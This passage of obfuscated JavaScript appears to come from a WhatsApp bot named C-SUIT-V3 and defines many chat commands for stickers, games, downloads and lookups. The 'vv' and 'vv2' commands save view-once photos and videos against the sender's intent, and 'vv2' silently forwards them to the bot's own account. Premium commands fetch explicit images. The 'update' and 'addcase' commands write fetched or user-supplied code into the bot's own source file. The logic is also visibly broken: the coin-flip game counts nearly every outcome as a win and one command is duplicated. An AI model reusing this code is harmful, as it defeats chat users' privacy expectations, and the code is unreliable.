            data: _0x4c105e
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x4c105e.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case 'stickcuddle':
        {
          axios.get("https://api.waifu.pics/sfw/cuddle").then(({
            data: _0x230e2e
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x230e2e.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "stickcringe":
        {
          axios.get("https://api.waifu.pics/sfw/cringe").then(({
            data: _0x243f51
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x243f51.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "stickdance":
        {
          axios.get("https://api.waifu.pics/sfw/dance").then(({
            data: _0x149a17
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x149a17.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "stickhappy":
        {
          axios.get("https://api.waifu.pics/sfw/happy").then(({
            data: _0x4de744
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x4de744.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "stickglomp":
        {
          axios.get('https://api.waifu.pics/sfw/glomp').then(({
            data: _0x4658f8
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x4658f8.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "sticksmug":
        {
          axios.get("https://api.waifu.pics/sfw/smug").then(({
            data: _0x3f029f
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x3f029f.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "stickblush":
        {
          axios.get("https://api.waifu.pics/sfw/blush").then(({
            data: _0x34cc4a
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x34cc4a.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case 'stickawoo':
        {
          axios.get("https://api.waifu.pics/sfw/awoo").then(({
            data: _0x5ed0b3
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x5ed0b3.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case 'hot':
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Please choose one: heads or tails.\nExample: " + _0x1e0f65 + "hot tails");
          }
          const _0x4028f9 = q.toLowerCase();
          const _0xd819fb = ["head", 'tails'];
          if (!_0xd819fb.includes(_0x4028f9)) {
            return _0x4242ca("Invalid choice. Please choose 'head', or 'tails'.");
          }
          const _0xfd55d = _0xd819fb[Math.floor(Math.random() * _0xd819fb.length)];
          let _0xfbe767;
          if (_0x4028f9 === _0xfd55d) {
            _0xfbe767 = "It's a draw!";
          } else if (_0x4028f9 === "head" && _0xfd55d === "tails" || _0x4028f9 === "tails" && _0xfd55d === "tails" || _0x4028f9 === "head" && _0xfd55d === 'head' || _0x4028f9 === "tails" && _0xfd55d === "head") {
            _0xfbe767 = "You win! 🎉";
          } else {
            _0xfbe767 = "You lose! 😢";
          }
          _0x4242ca("🤖 *Head or tails*\n\nYou chose: *" + _0x4028f9 + "*\nI chose: *" + _0xfd55d + "*\n\n*Result:* " + _0xfbe767);
          break;
        }
      case "rps":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Please choose one: rock, paper, or scissors.\nExample: " + _0x1e0f65 + "rps rock");
          }
          const _0x1fc4d0 = q.toLowerCase();
          const _0x22a418 = ["rock", 'paper', "scissors"];
          if (!_0x22a418.includes(_0x1fc4d0)) {
            return _0x4242ca("Invalid choice. Please choose 'rock', 'paper', or 'scissors'.");
          }
          const _0x60b5e = _0x22a418[Math.floor(Math.random() * _0x22a418.length)];
          let _0x3e2469;
          if (_0x1fc4d0 === _0x60b5e) {
            _0x3e2469 = "It's a draw!";
          } else if (_0x1fc4d0 === 'rock' && _0x60b5e === "scissors" || _0x1fc4d0 === 'paper' && _0x60b5e === "rock" || _0x1fc4d0 === "scissors" && _0x60b5e === "paper") {
            _0x3e2469 = "You win! 🎉";
          } else {
            _0x3e2469 = "You lose! 😢";
          }
          _0x4242ca("🤖 *Rock, Paper, Scissors*\n\nYou chose: *" + _0x1fc4d0 + "*\nI chose: *" + _0x60b5e + "*\n\n*Result:* " + _0x3e2469);
          break;
        }
      case "stickwave":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '🍭',
              'key': _0x5f530e.key
            }
          });
          axios.get("https://api.waifu.pics/sfw/wave").then(({
            data: _0x37ec0a
          }) => {
            _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x37ec0a.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author
            });
          });
        }
        break;
      case "getlyrics":
        {
          if (!_0x208b05) {
            return _0x5f530e.reply("Usage: " + (_0x1e0f65 + _0x418bf4) + " <song title> by <artist name>");
          }
          const [_0xd6e388, _0x48bc78] = _0x208b05.split(" by ");
          if (!_0xd6e388 || !_0x48bc78) {
            return _0x5f530e.reply("Please provide both the song title and the artist name. Usage: " + (_0x1e0f65 + _0x418bf4) + " <song title> by <artist name>");
          }
          const _0x15e3a4 = "https://api.davidcyriltech.my.id/lyrics2?t=" + encodeURIComponent(_0xd6e388) + '&a=' + encodeURIComponent(_0x48bc78);
          try {
            console.log("Fetching lyrics for: " + _0xd6e388 + " by " + _0x48bc78);
            const _0xdb93f5 = await axios.get(_0x15e3a4);
            const _0x5bf8c0 = _0xdb93f5.data.lyrics;
            const _0x4b1d66 = _0x5bf8c0.match(/.{1,4096}/g);
            for (const _0x116ca7 of _0x4b1d66) {
              await _0x239047.sendMessage(_0x5f530e.chat, {
                'text': _0x116ca7
              }, {
                'quoted': _0x5f530e
              });
            }
          } catch (_0x5a7953) {
            console.error("Error occurred:", _0x5a7953);
            _0x5f530e.reply("An error occurred: " + _0x5a7953.message);
          }
        }
        break;
      case 'totalcase':
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          penis = fs.readFileSync("./C-Suit-v3.js").toString();
          matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x1bf3fe => _0x1bf3fe.match(/case '([^']+)'/)[0x1]);
          let _0x5445d2 = caseNames.join("\n• ");
          _0x4242ca("Total case: " + caseCount + "\n\n• " + (caseCount > 0x0 ? _0x5445d2 : "No cases found."));
        }
        break;
      case "txt2img":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': "🖼️",
              'key': _0x5f530e.key
            }
          });
          if (!_0x208b05) {
            return _0x5f530e.reply("Usage: " + _0x1e0f65 + "txt2img <prompt>");
          }
          try {
            const _0x387ca7 = 'https://apitoxxictechinc.vercel.app/api/txt2img?prompt=' + encodeURIComponent(_0x208b05) + "&apikey=toxxicboy";
            const _0x19e9e0 = await axios.get(_0x387ca7);
            if (_0x19e9e0.data.status !== "success" || !_0x19e9e0.data.result) {
              throw new Error("Failed to generate image from the API.");
            }
            const _0xa590f7 = _0x19e9e0.data.result;
            const _0x36e3a7 = {
              'image': {
                'url': _0xa590f7
              },
              'caption': "C SUIT RESULTS ON " + _0x208b05,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'mediaType': 0x2,
                  'mediaUrl': _0xa590f7,
                  'title': "Image Generation",
                  'body': "Prompt: " + _0x208b05,
                  'sourceUrl': _0xa590f7,
                  'thumbnail': await (await axios.get(_0xa590f7, {
                    'responseType': "arraybuffer"
                  })).data
                }
              }
            };
            return _0x239047.sendMessage(_0x5f530e.chat, _0x36e3a7, {
              'quoted': _0x5f530e
            });
          } catch (_0x5c378e) {
            console.error(_0x5c378e);
            _0x5f530e.reply("An error occurred: " + _0x5c378e.message);
          }
        }
        break;
      case "dev":
      case "lostboy":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': "👑️",
              'key': _0x5f530e.key
            }
          });
          _0x4242ca("═════════════════════╼\n│    *「 𝐌𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧🎗️」*\n│ *ᴺᵃᵐᵉ*   : *LOST BOY* \n│ *ᴬᵍᵉ*     : *𝐈𝐦 𝟏4 𝐲𝐞𝐚𝐫𝐬* \n│ *ᴴᵒᵇᵇʸ*   : *TECH* \n│ *ᴿᵒˡᵉ*       : *TOXXIC* \n│ *ᵂᵒʳᵈˢ*   : *TYPE SHII* \n│ *ˢᵗᵃᵗᵘˢ*    : *𝐀𝐥𝐢𝐯𝐞* \n│  ●LOSTBOY \n╰━━━━━━━━━━━━━━━━━━━━━━━━━╼");
        }
        break;
      case 'readviewonce':
      case 'vv':
        {
          if (!_0x5f530e.quoted) {
            return _0x4242ca("Reply to view once message");
          }
          if (_0x5f530e.quoted.mtype !== "viewOnceMessageV2") {
            return _0x4242ca("This is not a view once message");
          }
          let _0x53bbae = _0x5f530e.quoted.message;
          let _0x23c0f8 = Object.keys(_0x53bbae)[0x0];
          let _0x25ee30 = await downloadContentFromMessage(_0x53bbae[_0x23c0f8], _0x23c0f8 == "imageMessage" ? "image" : "video");
          let _0x15be13 = Buffer.from([]);
          for await (const _0x42bceb of _0x25ee30) {
            _0x15be13 = Buffer.concat([_0x15be13, _0x42bceb]);
          }
          if (/video/.test(_0x23c0f8)) {
            return _0x239047.sendFile(_0x5f530e.chat, _0x15be13, "media.mp4", _0x53bbae[_0x23c0f8].caption || '', _0x5f530e);
          } else {
            if (/image/.test(_0x23c0f8)) {
              return _0x239047.sendFile(_0x5f530e.chat, _0x15be13, 'media.jpg', _0x53bbae[_0x23c0f8].caption || '', _0x5f530e);
            }
          }
        }
        break;
      case "totalcase":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          penis = fs.readFileSync('./C-Suit-v3.js').toString();
          matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x6fa649 => _0x6fa649.match(/case '([^']+)'/)[0x1]);
          let _0x3b8369 = caseNames.join("\n• ");
          _0x4242ca("Total case: " + caseCount + "\n\n• " + (caseCount > 0x0 ? _0x3b8369 : "No cases found."));
        }
        break;
      case "cecan-indo":
        {
          await _0x740dec();
          try {
            console.log("Fetching data from the API...");
            const _0x1de09e = await fetch("https://api.agatz.xyz/api/indonesia");
            if (!_0x1de09e.ok) {
              throw new Error("HTTP error! Status: " + _0x1de09e.status);
            }
            const _0x59d5e4 = await _0x1de09e.json();
            console.log("API Response:", _0x59d5e4);
            const _0x58ac5b = _0x59d5e4.data?.["url"];
            if (!_0x58ac5b) {
              return _0x4242ca("Failed to register img.");
            }
            await _0x239047.sendMessage(_0x39554b, {
              'image': {
                'url': _0x58ac5b
              },
              'caption': "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑰𝒏𝒅𝒐𝒏𝒆𝒔𝒊𝒂 🇮🇩\n\n> C SUIT V3"
            }, {
              'quoted': _0x5f530e
            });
          } catch (_0xcb1530) {
            console.error("Error in cecan-indo case:", _0xcb1530);
            _0x4242ca("Error occured.");
          }
          break;
        }
      case "encode":
        {
          const _0x359516 = _0x5f530e.quoted?.["text"] || _0x4376c7.join(" ");
          if (!_0x359516) {
            return _0x4242ca("`Provide a message.`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: " + (_0x1e0f65 + _0x418bf4) + " lostboy*");
          }
          try {
            await _0x740dec();
            const _0x29a4fd = "https://api.popcat.xyz/encode?text=" + encodeURIComponent(_0x359516);
            const _0x46568f = await fetch(_0x29a4fd);
            const _0x198814 = await _0x46568f.json();
            if (!_0x198814.binary) {
              return _0x4242ca("Failed to encode.");
            }
            _0x4242ca('' + _0x198814.binary);
          } catch (_0x3930a) {
            console.error("Error in encode case:", _0x3930a);
            _0x4242ca(" *Error occured.");
          }
          break;
        }
      case 'decode':
        {
          let _0x580fb9 = _0x5f530e.quoted?.["text"] || _0x4376c7.join(" ");
          _0x580fb9 = _0x580fb9.replace(/[`*\n\r]/g, '').trim();
          if (!_0x580fb9) {
            return _0x4242ca("`Please provide an encoded code to decode.`\n*Example: " + (_0x1e0f65 + _0x418bf4) + " 𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟘𝟟*");
          }
          try {
            await _0x740dec();
            const _0x2ced77 = "https://api.popcat.xyz/decode?binary=" + encodeURIComponent(_0x580fb9);
            const _0x4b774f = await fetch(_0x2ced77);
            const _0x236007 = await _0x4b774f.json();
            if (!_0x236007.text) {
              return _0x4242ca("Failed to decode.");
            }
            _0x4242ca("*🔤 Decoded Text:*\n\n```" + _0x236007.text + "```");
          } catch (_0x117975) {
            console.error("Error in decode case:", _0x117975);
            _0x4242ca("An error occured.");
          }
          break;
        }
      case "vv2":
        {
          if (!_0x5f530e.quoted) {
            return _0x4242ca("Reply to view once message");
          }
          if (_0x5f530e.quoted.mtype !== "viewOnceMessageV2") {
            return _0x4242ca("This is not a view once message");
          }
          let _0x2ef1f6 = _0x5f530e.quoted.message;
          let _0x476441 = Object.keys(_0x2ef1f6)[0x0];
          let _0x14e69e = await downloadContentFromMessage(_0x2ef1f6[_0x476441], _0x476441 == "imageMessage" ? 'image' : "video");
          let _0x11893f = Buffer.from([]);
          for await (const _0x4ab6f0 of _0x14e69e) {
            _0x11893f = Buffer.concat([_0x11893f, _0x4ab6f0]);
          }
          if (/video/.test(_0x476441)) {
            return _0x239047.sendFile(_0x239047.user.id, _0x11893f, "media.mp4", _0x2ef1f6[_0x476441].caption || '', _0x5f530e);
          } else {
            if (/image/.test(_0x476441)) {
              return _0x239047.sendFile(_0x239047.user.id, _0x11893f, "media.jpg", _0x2ef1f6[_0x476441].caption || '', _0x5f530e);
            }
          }
        }
        break;
      case "remini":
      case "tohd":
      case 'hd':
        {
          if (/image/g.test(_0x49e192)) {
            _0x5f530e.reply(_0x462702.wait);
            let _0x3ea60b;
            if (/remini/gi.test(_0x418bf4)) {
              _0x3ea60b = 0x4;
            }
            if (/tohd|hd/gi.test(_0x418bf4)) {
              _0x3ea60b = 0x2;
            }
            await _0x239047.downloadAndSaveMediaMessage(_0x31f71a).then(async _0x11e1a8 => {
              let _0x47e06e = await telegraPh(_0x11e1a8);
              let _0x156c18 = await fetchJson("https://aemt.me/remini?url=" + _0x47e06e + "&resolusi=" + _0x3ea60b);
              if (!_0x156c18.status) {
                return _0x5f530e.reply("Error!");
              }
              await _0x239047.sendMessage(_0x5f530e.chat, {
                'image': {
                  'url': _0x156c18.url
                },
                'caption': "Donel ✅"
              }, {
                'quoted': _0x5f530e
              });
              await fs.unlinkSync(_0x11e1a8);
            })["catch"](_0x42d46c => _0x5f530e.reply(_0x42d46c.toString()));
          } else {
            return _0x5f530e.reply(example("Reply to an image"));
          }
        }
        break;
      case "ttt":
      case 'ttc':
      case 'tictactoe':
        {
          if (!_0x5f530e.isGroup) {
            return onlyGrup();
          }
          let _0x17f269 = require("./lib/game/tictactoe");
          this.game = this.game ? this.game : {};
          if (Object.values(this.game).find(_0x5d5173 => _0x5d5173.id.startsWith("tictactoe") && [_0x5d5173.game.playerX, _0x5d5173.game.playerO].includes(_0x5f530e.sender))) {
            return _0x5f530e.reply("You are still in the game!");
          }
          let _0xec62bf = Object.values(this.game).find(_0x1d335a => _0x1d335a.state === "WAITING" && (_0x208b05 ? _0x1d335a.name === _0x208b05 : true));
          if (_0xec62bf) {
            _0x5f530e.reply("Opponent found !");
            _0xec62bf.o = _0x5f530e.chat;
            _0xec62bf.game.playerO = _0x5f530e.sender;
            _0xec62bf.state = "PLAYING";
            let _0x4a5722 = _0xec62bf.game.render().map(_0x36c6ea => {
              return {
                'X': '❌',
                'O': '⭕',
                0x1: "1️⃣",
                0x2: "2️⃣",
                0x3: "3️⃣",
                0x4: "4️⃣",
                0x5: "5️⃣",
                0x6: "6️⃣",
                0x7: "7️⃣",
                0x8: "8️⃣",
                0x9: "9️⃣"
              }[_0x36c6ea];
            });
            let _0x8654b3 = "Room ID: " + _0xec62bf.id + "\n\n" + _0x4a5722.slice(0x0, 0x3).join('') + "\n" + _0x4a5722.slice(0x3, 0x6).join('') + "\n" + _0x4a5722.slice(0x6).join('') + "\n\nWait  @" + _0xec62bf.game.currentTurn.split('@')[0x0] + "\n\nType .nyerah to surrender ";
            if (_0xec62bf.x !== _0xec62bf.o) {
              await _0x239047.sendText(_0xec62bf.x, _0x8654b3, _0x5f530e, {
                'mentions': parseMention(_0x8654b3)
              });
            }
            await _0x239047.sendText(_0xec62bf.o, _0x8654b3, _0x5f530e, {
              'mentions': parseMention(_0x8654b3)
            });
          } else {
            _0xec62bf = {
              'id': "tictactoe-" + +new Date(),
              'x': _0x5f530e.chat,
              'o': '',
              'game': new _0x17f269(_0x5f530e.sender, 'o'),
              'state': "WAITING"
            };
            if (_0x208b05) {
              _0xec62bf.name = _0x208b05;
            }
            _0x5f530e.reply("Waiting for opponent to play " + (_0x208b05 ? " type the command below  " + (_0x1e0f65 + _0x418bf4) + " " + _0x208b05 : ''));
            this.game[_0xec62bf.id] = _0xec62bf;
          }
        }
        break;
      case "tiktokvideo":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("*Only Premium Members Are Allowed To Use This Command*");
          }
          if (!_0x208b05) {
            return _0x4242ca("Example : " + (_0x1e0f65 + _0x418bf4) + " link");
          }
          if (!q.includes("tiktok")) {
            return _0x4242ca("Link Invalid!!");
          }
          await _0x740dec();
          require('./lib/tiktok').Tiktok(q).then(_0x4b5d56 => {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': {
                'url': _0x4b5d56.nowm
              }
            }, {
              'quoted': _0x5f530e
            });
          });
        }
        break;
      case "tagadmin":
      case "listadmin":
        {
          if (!_0x5f530e.isGroup) {
            return _0x4242ca("This command can only be used in groups");
          }
          const _0x32e67b = _0x5ef702.filter(_0x2c42ac => _0x2c42ac.admin);
          const _0x22f761 = _0x32e67b.map((_0x331c68, _0x397365) => _0x397365 + 0x1 + ". @" + _0x331c68.id.split('@')[0x0]).join("\n");
          _0x4242ca("*Group Admins:*\n" + _0x22f761, {
            'mentions': _0x32e67b.map(_0x1ef980 => _0x1ef980.id)
          });
        }
        break;
      case "trap":
        if (!_0x2fc88e) {
          return onlyPremium();
        }
        await _0x740dec();
        let _0x1abd26 = await axios.get("https://waifu.pics/api/nsfw/" + _0x418bf4);
        _0x239047.sendMessage(_0x5f530e.chat, {
          'caption': "> C-SUIT-V3",
          'image': {
            'url': _0x1abd26.data.url
          }
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "hneko":
        if (!_0x2fc88e) {
          return onlyPremium();
        }
        await _0x740dec();
        let _0x59805c = await axios.get("https://waifu.pics/api/nsfw/neko");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'caption': "> C-SUIT-V3",
          'image': {
            'url': _0x59805c.data.url
          }
        }, {
          'quoted': _0x5f530e
        });
        break;
      case 'nwaifu':
        if (!_0x2fc88e) {
          return onlyPremium();
        }
        await _0x740dec();
        let _0x183dd1 = await axios.get("https://waifu.pics/api/nsfw/waifu");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'caption': "> C-SUIT-V3",
          'image': {
            'url': _0x183dd1.data.url
          }
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "animespank":
        if (!_0x2fc88e) {
          return onlyPremium();
        }
        await _0x740dec();
        let _0x43aab6 = await axios.get('https://nekos.life/api/v2/img/spank');
        _0x239047.sendMessage(_0x5f530e.chat, {
          'caption': "> C-SUIT-V3",
          'image': {
            'url': _0x43aab6.data.url
          }
        }, {
          'quoted': _0x5f530e
        })["catch"](_0x15afda => {
          return "Error!";
        });
        break;
      case "gifblowjob":
        if (!_0x2fc88e) {
          return onlyPremium();
        }
        await _0x740dec();
        let _0x230d5d = await axios.get("https://api.waifu.pics/nsfw/blowjob");
        var _0x521b25 = await fetchBuffer(_0x230d5d.data.url);
        var _0x4c5cd2 = await buffergif(_0x521b25);
        _0x239047.sendMessage(_0x5f530e.chat, {
          'video': _0x4c5cd2,
          'gifPlayback': true
        }, {
          'quoted': _0x5f530e
        })['catch'](_0xec78b5 => {});
        break;
      case "listcase":
        {
          const _0x3a8c52 = () => {
            const _0x3ec871 = fs.readFileSync('./C-Suit-V3.js', 'utf8');
            var _0x252f1a = [];
            var _0x34db75;
            while (_0x34db75 = exec(_0x3ec871)) {
              _0x252f1a.push(_0x34db75[0x1]);
            }
            let _0x2e1685 = "*Total Case*: " + _0x252f1a.length + " \n\n";
            _0x252f1a.forEach(function (_0x383da4) {
              _0x2e1685 += "☞ " + _0x383da4 + "\n";
            });
            _0x2e1685 += "\n> C-SUIT-V3";
            return _0x2e1685;
          };
          _0x4242ca(_0x3a8c52());
        }
        break;
      case 'ss':
      case "ssweb":
        {
          if (!_0x208b05) {
            return _0x4242ca("*Example*: " + (_0x1e0f65 + _0x418bf4) + " https://www.");
          }
          try {
            await _0x239047.sendMessage(_0x5f530e.chat, {
              'react': {
                'text': '📸',
                'key': _0x5f530e?.["key"]
              }
            });
            const _0x4cc9ad = "https://api.davidcyriltech.my.id/ssweb?url=" + encodeURIComponent(_0x208b05) + "&device=tablet";
            const _0xf5abe7 = await axios.get(_0x4cc9ad);
            if (_0xf5abe7.data && _0xf5abe7.data.success) {
              const {
                screenshotUrl: _0x5198d1
              } = _0xf5abe7.data;
              await _0x239047.sendMessage(_0x5f530e.chat, {
                'image': {
                  'url': _0x5198d1
                },
                'caption': "🖼️ *Web Screenshot* \n\n🌐 URL: " + _0x208b05 + "\n📱 Device: Tablet\n\n> C-SUIT-V3"
              }, {
                'quoted': _0x5f530e
              });
            } else {
              _0x4242ca("*Failed to capture the screenshot! Please check the URL and try again.*");
            }
          } catch (_0x578d32) {
            console.error("Error during ssweb command:", _0x578d32);
            _0x4242ca("*An error occurred while processing your request. Please try again later.*");
          }
          break;
        }
      case "mediafire":
        {
          if (!_0x208b05) {
            return _0x4242ca("*Example*: " + (_0x1e0f65 + _0x418bf4) + " https://www.mediafire.com/");
          }
          try {
            await _0x239047.sendMessage(_0x5f530e.chat, {
              'react': {
                'text': '📥',
                'key': _0x5f530e?.['key']
              }
            });
            const _0xd3dfbe = "https://api.davidcyriltech.my.id/mediafire?url=" + encodeURIComponent(_0x208b05);
            const _0x38c852 = await axios.get(_0xd3dfbe);
            if (_0x38c852.data && _0x38c852.data.downloadLink) {
              const {
                fileName: _0x4045ec,
                mimeType: _0x1d620d,
                downloadLink: _0x474bfb
              } = _0x38c852.data;
              await _0x239047.sendMessage(_0x5f530e.chat, {
                'document': {
                  'url': _0x474bfb
                },
                'mimetype': _0x1d620d,
                'fileName': _0x4045ec,
                'caption': "📦 *File Name:* " + _0x4045ec + "\n\n> CSUIT V3"
              }, {
                'quoted': _0x5f530e
              });
            } else {
              _0x4242ca("*Failed to fetch file details! Please check the MediaFire URL and try again.*");
            }
          } catch (_0x40fb67) {
            console.error("Error during MediaFire command:", _0x40fb67);
            _0x4242ca("*An error occurred while processing your request. Please try again later.*");
          }
          break;
        }
      case 'tourl':
      case "url":
        {
          try {
            _0x740dec();
            const _0x491cf1 = await _0x239047.downloadAndSaveMediaMessage(_0x31f71a);
            console.log("Media downloaded:", _0x491cf1);
            if (!_0x491cf1) {
              throw new Error("Failed to download media");
            }
            const _0x465dca = await fs.promises.stat(_0x491cf1);
            if (_0x465dca.size === 0x0) {
              throw new Error("The downloaded media file is empty.");
            }
            let _0x47c74c;
            const _0x2dfa99 = _0x31f71a.mimetype;
            if (_0x2dfa99.startsWith("image/")) {
              _0x47c74c = await uploadToCatbox(_0x491cf1);
            } else {
              _0x47c74c = await uploadToFileIo(_0x491cf1);
            }
            if (!_0x47c74c) {
              throw new Error("Failed to upload file");
            }
            _0x5f530e.reply(util.format(_0x47c74c));
            await fs.promises.unlink(_0x491cf1);
          } catch (_0x1eba50) {
            console.error("Error during the URL upload process:", _0x1eba50.message);
            _0x4242ca("An error occurred while uploading the file. Please try again.");
          }
        }
        break;
      case "fbvideo":
        if (_0x4376c7.length == 0x0) {
          return _0x4242ca("Example: " + (_0x1e0f65 + _0x418bf4) + " https://www.facebook.com/share/v/15fNp5gHK4/");
        }
        await _0x740dec();
        axios.get("https://api.davidcyriltech.my.id/facebook?url=" + _0x4376c7[0x0]).then(({
          data: _0x51a162
        }) => {
          if (!_0x51a162.result) {
            return _0x4242ca("Failed to retrieve video. Please check the URL and try again.");
          }
          _0x239047.sendMessage(_0x39554b, {
            'video': {
              'url': _0x51a162.result
            },
            'mimetype': "video/mp4",
            'caption': "Silahkan ketik *tovn* atau *toaudio* untuk mengubahnya menjadi audio/VN."
          });
        })["catch"](_0x959f2f => {
          console.error("Error fetching Facebook video:", _0x959f2f);
          _0x4242ca("An error occurred while fetching the Facebook video.");
        });
        break;
      case "translate":
        {
          const _0x46b705 = _0x4376c7[0x0];
          const _0xf9ae61 = _0x5f530e.quoted?.["text"] || _0x4376c7.slice(0x1).join(" ");
          if (!_0x46b705 || !_0xf9ae61) {
            return _0x4242ca("`what should i translate`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: " + (_0x1e0f65 + _0x418bf4) + " en Hola\n        > ALWAYS BRING \"EN\" BEFORE WORD");
          }
          try {
            await _0x740dec();
            const _0x3c0bfc = "https://api.popcat.xyz/translate?to=" + _0x46b705 + "&text=" + encodeURIComponent(_0xf9ae61);
            const _0x237bfb = await fetch(_0x3c0bfc);
            const _0x3050b = await _0x237bfb.json();
            console.log("Translation Response:", _0x3050b);
            if (!_0x3050b.translated) {
              return _0x4242ca('Failed🙃.');
            }
            _0x4242ca("*Translated text:*\n\n```" + _0x3050b.translated + "```");
          } catch (_0x159d9f) {
            console.error("Error in translate case:", _0x159d9f);
            _0x4242ca("Error occured😑.");
          }
          break;
        }
      case "update":
        {
          if (!_0x11eb7e) {
            return ownernya();
          }
          if (!fs.existsSync('./')) {
            fs.mkdirSync('./');
          }
          async function _0x2c7f3a(_0x190def) {
            const _0x37fa28 = "https://raw.githubusercontent.com/LOSTBOY1-TCH/C_Suit_V3/main/" + _0x190def;
            try {
              _0x4242ca("Downloading: " + _0x190def);
              const _0x3062d4 = await fetch(_0x37fa28);
              if (!_0x3062d4.ok) {
                throw new Error("HTTP error! Status: " + _0x3062d4.status);
              }
              const _0x4cb4ec = await _0x3062d4.text();
              const _0x25929a = path.join('./', _0x190def);
              fs.mkdirSync(path.dirname(_0x25929a), {
                'recursive': true
              });
              fs.writeFileSync(_0x25929a, _0x4cb4ec, "utf8");
              _0x4242ca("Successfully updated: " + _0x190def);
            } catch (_0x4a669f) {
              _0x4242ca("Error downloading file: " + _0x190def + " - " + _0x4a669f.message);
              _0x4242ca("C SUIT V3 Auto Update Failed\nPlease Type .repo and Sync Fork and redeploy the Latest Version!");
            }
          }
          const _0x221b03 = ["C-Suit-v3.js"];
          _0x4242ca("Starting update process...");
          Promise.all(_0x221b03.map(_0x45b050 => _0x2c7f3a(_0x45b050))).then(() => {
            _0x4242ca("C SUIT V3 Has Automatically Updated To Latest Version");
          })['catch'](() => {
            _0x4242ca("Some files failed to update.");
          });
          break;
        }
      case "git":
      case 'gitclone':
        {
          if (!_0x4376c7[0x0]) {
            return _0x4242ca("Where is the link?\nExample :\n" + (_0x1e0f65 ? _0x1e0f65 : '.') + _0x418bf4 + " https://github.com/LOSTBOY1-TCH/C_Suit_V3 ");
          }
          if (!isUrl(_0x4376c7[0x0]) && !_0x4376c7[0x0].includes("github.com")) {
            return _0x4242ca("Link invalid!!");
          }
          await _0x4242ca(mess.wait);
          let _0x393a49 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
          let [, _0x3cc511, _0x9928af] = _0x4376c7[0x0].match(_0x393a49) || [];
          _0x9928af = _0x9928af.replace(/.git$/, '');
          let _0x473de6 = "https://api.github.com/repos/" + _0x3cc511 + '/' + _0x9928af + "/zipball";
          let _0x5f5bae = (await fetch(_0x473de6, {
            'method': "HEAD"
          })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[0x1];
          _0x239047.sendMessage(_0x5f530e.chat, {
            'document': {
              'url': _0x473de6
            },
            'fileName': _0x5f5bae + ".zip",
            'mimetype': 'application/zip'
          }, {
            'quoted': _0x5f530e
          })["catch"](_0x5f3d2d => _0x4242ca(_0x5f3d2d));
        }
        break;
      case "addcase":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.only.owner);
          }
          if (!_0x208b05) {
            return _0x4242ca("Wheres the case?");
          }
          const _0x191aa3 = require('fs');
          const _0x4091eb = '' + _0x208b05;
          _0x191aa3.readFile("C-Suit-v3.js", "utf8", (_0x379de2, _0x282341) => {
            if (_0x379de2) {
              console.error("An error occurred while reading the file:", _0x379de2);
              return;
            }
            const _0x28b3fe = _0x282341.indexOf("case 'addcase':");
            if (_0x28b3fe !== -0x1) {
              const _0x27602d = _0x282341.slice(0x0, _0x28b3fe) + "\n" + _0x4091eb + "\n" + _0x282341.slice(_0x28b3fe);
              _0x191aa3.writeFile("C-Suit-v3.js", _0x27602d, "utf8", _0x7e2593 => {
                if (_0x7e2593) {
                  _0x4242ca("An error occurred while writing the file:", _0x7e2593);
                } else {
                  _0x4242ca("New case successfully added above gimage case.");
                }
              });
            } else {
              _0x4242ca("Cannot find gimage case in files.");
            }
          });
        }
        break;
      case 'getcase':
        if (!_0x11eb7e) {
